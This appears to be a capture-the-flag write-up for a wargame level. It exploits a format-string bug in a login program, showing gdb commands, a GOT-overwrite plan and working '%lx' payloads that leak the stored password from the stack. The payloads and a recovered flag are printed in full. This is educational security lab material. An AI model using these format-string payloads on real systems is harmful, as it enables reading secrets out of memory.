## level02

level02.c decompilation unchecked

```
(echo -e 'set disassembly-flavor intel\nset pagination off\nb main\nrun\ndisas' ; cat) | gdb level02
```

```
level02@OverRide:~$ echo -e '%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x\npa
ssword' | ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
ffffe4000702a2a2a2a2a2a2a2affffe5f8f7ff9a087373617000000000000003437684861733951574e67586e475873664b394d07825782578257825 does not have access!
```

27 values before repeating 7257825 ('%x' repeating from printf arg)

This is a printf vulnerability, similar to levels 3 to 5 of rainfall.

```c
if (strncmp(ptr, password, 41)) {
    printf(username);
    puts(" does not have access!");
    exit(1);
}
printf("Greetings, %s!\n", username);
system("/bin/sh");
```

We'll overwrite the address of the GOT exit with the address where `system("/bin/sh")` is called.

```
   0x0000000000400a80 <+620>:   call   0x4006c0 <printf@plt>
   0x0000000000400a85 <+625>:   mov    edi,0x400d32
   0x0000000000400a8a <+630>:   call   0x4006b0 <system@plt>
```

```
(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0x0000000000400710  exit
0x0000000000400710  exit@plt
0x00007ffff7a57580  exit
[...]
(gdb) disas 0x0000000000400710
Dump of assembler code for function exit@plt:
   0x0000000000400710 <+0>:     jmp    QWORD PTR [rip+0x200b12]        # 0x601228 <exit@got.plt>
   0x0000000000400716 <+6>:     push   0xa
   0x000000000040071b <+11>:    jmp    0x400660
End of assembler dump.
```

`exit` will jump to `0x00601228`

Except this causes a lot of problems because the address has zeros, which will end the formast string hmmmmmmmmmmm.

---

But if we smart we can read the content of the file directly. It is between the username and the password on the stack. Through spamming, we find what looks like 40 random bytes between 2 zeros:

```
level02@OverRide:~$ python -c "print('%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx\npassword')" | ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
7fffffffe4000702a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a7fffffffe5f81f7ff9a0864726f777373617000000000000100000000|0|756e505234376848|45414a3561733951|377a7143574e6758|354a35686e475873|48336750664b394d|0|6c25786c25786c25|25786c25786c2578 does not have access!
```

Translating to ASCII (with the Python script) gives us the flag `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`
